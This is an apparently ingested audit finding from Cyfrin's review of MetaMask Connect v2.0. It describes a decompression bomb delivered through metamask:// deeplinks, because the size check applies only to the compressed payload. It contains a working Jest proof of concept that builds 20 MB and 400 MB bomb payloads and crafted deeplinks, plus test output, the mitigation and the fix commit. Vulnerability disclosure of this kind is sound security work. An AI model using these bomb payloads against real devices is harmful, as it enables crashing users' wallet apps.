---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-03-05-cyfrin-metamask-connect-v2-0-3-0
ingested_at: '2026-08-30T10:05:51Z'
protocol_category: []
published_at: '2026-03-05T00:00:00Z'
related_swc: []
severity: Informational
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-05-cyfrin-metamask-connect-v2.0.md
tags:
- firm:cyfrin
- report:2026-03-05-cyfrin-metamask-connect-v2-0
title: Decompression Bomb due to lack of  post decompression size check
vuln_class: []
---

# Decompression Bomb due to lack of  post decompression size check

_Section severity (from Solodit section header): Informational_  
_Audit firm: Cyfrin_  
_Source report: [2026-03-05-cyfrin-metamask-connect-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-05-cyfrin-metamask-connect-v2.0.md)_

---

**Description:** The deeplink connection flow enforces a 1 MB size limit on the **compressed, base64-encoded** payload and not the decompressed output. A crafted `~26 KB` deeplink trivially passes the guard and forces `pako.inflate()` to allocate an unbounded amount of heap memory. The wallet processes the bomb silently, establishing a full connection and persisting it to storage, with no error surfaced to the user.

An attacker can crash MetaMask Mobile or degrade device memory by sending a single deeplink. No authentication, no user account, and no existing session are required. The entire attack surface is reachable with a tap on a malicious `metamask://` URL.
```typescript
// connection-registry.ts
if (payload.length > 1024 * 1024) {   // checked on compressed + base64 input
    throw new Error('Payload too large (max 1MB).');
}
const jsonString =
    compressionFlag === '1' ? decompressPayloadB64(payload) : payload;
```
Inside `decompressPayloadB64`, `pako.inflate()` is called with **no output size limit**:
```typescript
// compression-utils.ts
const decompressed = inflate(compressed);  // no max_size / chunkSize limit
return new TextDecoder().decode(decompressed);
```

`payload` is the raw URL query parameter which is the base64 encoding of the compressed data. A 1 MB compressed stream encodes to ~1.33 MB base64, so the effective compressed size budget is ~750 KB. The decompressed output is **never validated**.

A single maximum-budget deeplink can force upto **~578 MB** of heap allocation in one call. Check PoC which we

**Impact:** A crafted compressed payload of ~750 KB (which passes the 1 MB base64 check) can expand to **500 MB+** of JSON data depending on content repetition. `JSON.parse()` on the resulting oversized string exhausts mobile process memory and crashes the MetaMask app. It is exploitable by anyone who can deliver a deeplink to the target device however its likelihood is quite low as only prior old devices would be practically impacted.

**Proof of Concept:** <details>
<summary>Add this to `connection-registry.test.ts` </summary>

``` typescript

 describe('Decompression Bomb', () => {
    // ES2017 lib only — no Buffer, no DOM btoa. Encode Uint8Array → base64
    // by iterating bytes and casting through charCodeAt.
    const u8ToB64 = (b: Uint8Array): string => {
      let s = '';
      for (let i = 0; i < b.length; i++) s += String.fromCharCode(b[i]);
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      return (global as any).btoa(s);
    };


    const buildBombB64 = () =>
      u8ToB64(
        deflate(
          JSON.stringify({
            ...mockConnectionRequest,
            _padding: 'A'.repeat(20_000_000),
          }),
        ),
      );


    // Building + deflating 400 MB takes ~8 s; Jest timeout extended to 30 s.
    const buildMaxExpansionBombB64 = () =>
      u8ToB64(
        deflate(
          JSON.stringify({
            ...mockConnectionRequest,
            _bomb: 'A'.repeat(400_000_000), // ~400 MB
          }),
        ),
      );


    it('should traverse the full connection flow without error when given a compressed bomb deeplink', async () => {
      // Given: a registry ready to handle connections
      registry = new ConnectionRegistry(
        RELAY_URL,
        mockKeyManager,
        mockHostApp,
        mockStore,
      );

      const b64 = buildBombB64();
      const deeplink = `metamask://connect/mwp?p=${encodeURIComponent(b64)}&c=1`;

      // The size guard passes — payload is ~33 KB, well under the 1 MB limit
        expect(b64.length).toBeLessThan(1024 * 1024);

      // When: the bomb deeplink is processed
      await registry.handleConnectDeeplink(deeplink);

      // Then: the full happy path completes — guard bypassed, ~20 MB allocated,
      //   connection created, saved to store, no error surfaced to the user
      expect(mockHostApp.showConnectionError).not.toHaveBeenCalled();
      expect(mockHostApp.showConnectionLoading).toHaveBeenCalledTimes(1);
      expect(Connection.create).toHaveBeenCalledTimes(1);
      expect(mockConnection.connect).toHaveBeenCalledTimes(1);
      expect(mockStore.save).toHaveBeenCalledTimes(1);
      expect(mockHostApp.hideConnectionLoading).toHaveBeenCalledTimes(1);
    });

    it('should process N distinct bomb deeplinks independently — no rate limit or concurrency cap exists', async () => {

      registry = new ConnectionRegistry(
        RELAY_URL,
        mockKeyManager,
        mockHostApp,
        mockStore,
      );

      const BOMB_COUNT = 3;
      const bombs = Array.from({ length: BOMB_COUNT }, (_, i) => {
        const b64 = u8ToB64(
          deflate(
            JSON.stringify({
              ...mockConnectionRequest,
              sessionRequest: {
                ...mockConnectionRequest.sessionRequest,
                id: `bomb-session-${i}`,
              },
              _padding: 'A'.repeat(20_000_000),
            }),
          ),
        );
        return `metamask://connect/mwp?p=${encodeURIComponent(b64)}&c=1`;
      });

      // Each deeplink has a unique URL, deduplication guard does not apply
      expect(new Set(bombs).size).toBe(BOMB_COUNT);


      (Connection.create as jest.Mock).mockResolvedValue({
        ...mockConnection,
        id: expect.any(String),
      });

      await Promise.all(bombs.map((dl) => registry.handleConnectDeeplink(dl)));

      // Then: all N inflate() calls complete — no rate limiting, no abort
      expect(mockHostApp.showConnectionError).not.toHaveBeenCalled();
      expect(Connection.create).toHaveBeenCalledTimes(BOMB_COUNT);
    });

    // Building + deflating 400 MB takes ~8 s — per-test timeout extended to 30 s.
    it('should accept a ~526 KB compressed payload and inflate it to 400 MB — guard checks pre-decompression size only', async () => {
      // Given: a registry ready to handle connections
      registry = new ConnectionRegistry(
        RELAY_URL,
        mockKeyManager,
        mockHostApp,
        mockStore,
      );

      // 400 MB of 'A' → deflate → ~394 KB compressed → ~526 KB base64
      const b64 = buildMaxExpansionBombB64();

      // The guard at connection-registry.ts:236 sees only the compressed+base64 length
      expect(b64.length).toBeGreaterThan(400_000);   // ~526 KB compressed+base64
      expect(b64.length).toBeLessThan(1024 * 1024);  // passes the 1 MB guard

      const out = compressionUtils.decompressPayloadB64(b64);
      expect(out.length).toBeGreaterThan(350_000_000);      // >350 MB actual data
      expect(out.length / b64.length).toBeGreaterThan(600); // >600× expansion ratio

      // When: the bomb is delivered as a deeplink
      const deeplink = `metamask://connect/mwp?p=${encodeURIComponent(b64)}&c=1`;
      await registry.handleConnectDeeplink(deeplink);

      expect(mockHostApp.showConnectionError).not.toHaveBeenCalled();
      expect(mockHostApp.showConnectionLoading).toHaveBeenCalledTimes(1);
      expect(Connection.create).toHaveBeenCalledTimes(1);
      expect(mockConnection.connect).toHaveBeenCalledTimes(1);
      expect(mockStore.save).toHaveBeenCalledTimes(1);
      expect(mockHostApp.hideConnectionLoading).toHaveBeenCalledTimes(1);
    }, 30_000); // 30 s — building + deflating 400 MB takes ~8 s
  });

```
```
Output:
    Decompression Bomb
      ✓ should expand a ~33 KB compressed payload to 20 MB — the guard checks compressed size only, leaving decompressed output unbounded (580 ms)
      ✓ should traverse the full connection flow without error when given a compressed bomb deeplink (548 ms)
      ✓ should process N distinct bomb deeplinks independently — no rate limit or concurrency cap exists (1197 ms)
      ✓ should accept a ~526 KB compressed payload and inflate it to 400 MB — guard checks pre-decompression size only (11599 ms)
```

</details>

**Recommended Mitigation:** Check post-decompression size in `decompressPayloadB64`

**Metamask:**
Fixed in commit [867acb](https://github.com/MetaMask/metamask-mobile/commit/867acb98f4f409d3feb7f413d9c59640190e70f0).

**Cyfrin:** Verified.
